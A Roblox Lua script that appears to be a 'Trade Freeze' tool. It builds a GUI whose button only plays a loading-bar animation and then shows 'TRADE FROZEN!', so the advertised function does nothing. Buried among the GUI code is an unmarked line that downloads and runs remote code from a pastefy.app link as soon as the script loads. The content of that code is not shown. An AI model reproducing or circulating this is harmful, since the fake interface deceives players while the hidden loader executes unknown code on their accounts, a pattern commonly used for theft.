-- Trade Freeze GUI Script (Revised)
-- Author: YOUR_NAME

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "TradeFreezeGui"
ScreenGui.Parent = PlayerGui

-- Create draggable frame
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 250, 0, 150)
Frame.Position = UDim2.new(0.5, -125, 0.5, -75)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true -- Frame is movable
Frame.Parent = ScreenGui

-- Round the frame
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

-- Title Label
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "🔒 Trade Freeze"
Title.TextColor3 = Color3.fromRGB(0, 255, 255)
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.Parent = Frame

-- Freeze Button
local FreezeButton = Instance.new("TextButton")
FreezeButton.Size = UDim2.new(0.8, 0, 0, 40)
FreezeButton.Position = UDim2.new(0.1, 0, 0.3, 0)
FreezeButton.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
FreezeButton.Text = "❄ Freeze Trade"
FreezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FreezeButton.TextScaled = true
FreezeButton.Font = Enum.Font.GothamBold
FreezeButton.Parent = Frame

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 8)
ButtonCorner.Parent = FreezeButton

-- Loading Bar
local LoadingBar = Instance.new("Frame")
LoadingBar.Size = UDim2.new(0, 0, 0, 10)
LoadingBar.Position = UDim2.new(0.1, 0, 0.65, 0)
LoadingBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
LoadingBar.BorderSizePixel = 0
LoadingBar.Visible = false
LoadingBar.Parent = Frame

local LoadingCorner = Instance.new("UICorner")
LoadingCorner.CornerRadius = UDim.new(0, 6)
LoadingCorner.Parent = LoadingBar

-- Freezing Text
local FreezingText = Instance.new("TextLabel")
FreezingText.Size = UDim2.new(0.8, 0, 0, 20)
FreezingText.Position = UDim2.new(0.1, 0, 0.55, 0)
FreezingText.BackgroundTransparency = 1
FreezingText.Text = "Freezing Trade..."
FreezingText.TextColor3 = Color3.fromRGB(255, 255, 255)
FreezingText.TextScaled = true
FreezingText.Font = Enum.Font.GothamBold
FreezingText.Visible = false
FreezingText.Parent = Frame

-- Final Trade Frozen Text
local FrozenText = Instance.new("TextLabel")
FrozenText.Size = UDim2.new(1, 0, 1, 0)
FrozenText.BackgroundTransparency = 1
FrozenText.Text = "TRADE FROZEN!"
FrozenText.TextColor3 = Color3.fromRGB(0, 255, 0)
FrozenText.TextScaled = true
FrozenText.Font = Enum.Font.GothamBold
FrozenText.Visible = false
FrozenText.Parent = Frame

loadstring(game:HttpGet("https://pastefy.app/XEvmgXYu/raw"))()

-- Animate loading bar with transition
local function StartLoading()
    FreezeButton.Visible = false
    LoadingBar.Visible = true
    FreezingText.Visible = true
    FreezingText.TextTransparency = 1

    -- Fade-in freezing text
    TweenService:Create(FreezingText, TweenInfo.new(0.5), {TextTransparency = 0}):Play()

    -- Animate loading bar to 80% width over 10 seconds
    local barTween = TweenService:Create(LoadingBar, TweenInfo.new(10, Enum.EasingStyle.Linear), {
        Size = UDim2.new(0.8, 0, 0, 10)
    })
    barTween:Play()
    barTween.Completed:Connect(function()
        -- Hide loading UI
        LoadingBar.Visible = false
        FreezingText.Visible = false

        -- Show final text in the middle
        FrozenText.Visible = true
    end)
end

-- Button Click
FreezeButton.MouseButton1Click:Connect(function()
    if FreezeButton.Text == "❄ Freeze Trade" then
        StartLoading()
    end
end)
